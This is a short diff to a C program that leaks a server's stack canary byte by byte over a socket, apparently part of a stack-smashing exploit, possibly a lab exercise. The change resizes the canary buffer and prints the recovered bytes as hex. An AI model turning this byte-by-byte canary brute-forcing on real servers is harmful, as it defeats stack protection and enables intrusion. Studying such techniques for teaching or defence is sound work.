@@ -7,7 +7,7 @@
 
 //#define PORT (8080)
 #define ARRAY_SIZE (100)
-#define CANARY_SIZE (10)
+#define CANARY_SIZE (8)
 
 int createChild(char *input) {
 	pid_t cpid; 
@@ -114,17 +114,17 @@ int main(int argc, char const *argv[]) {
 	input[smashLoc - 1] = '\0';
 	
 	char canary[CANARY_SIZE];	
+	printf("Canary hex: ");
 	for (int i = 0; i < CANARY_SIZE; i++) {
 		int byte = getOneByte(sock, serverAddress, input, i + smashLoc);
-		printf("Next byte: %d\n", byte);
+		printf("%02x", (char) byte);
 		if (byte == -1) {
-			printf("Could not get canary byte @ idx=%d\n", i);
+			printf("\nCould not get canary byte @ idx=%d\n", i);
 			return 0;
 		}
 		canary[i] = byte;
 	}
-
-	printf("Canary string: %s\n", canary);
+	printf("\nCanary string ascii: %s\n", canary);
   
     return 0; 
 }
